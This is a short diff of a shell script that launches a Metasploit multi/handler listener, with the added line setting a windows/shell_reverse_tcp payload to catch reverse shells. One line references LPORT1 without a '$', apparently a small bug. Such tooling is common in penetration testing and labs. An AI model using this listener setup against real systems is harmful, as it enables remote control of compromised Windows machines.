@@ -19,6 +19,7 @@ ECHO "starting the listener............."
 msfconsole -q -x "use exploit/multi/handler;\ 
 set LHOST $LHOST1;\
 set LPORT LPORT1;\
+set PAYLOAD windows/shell_reverse_tcp;\
 exploit"
  
 
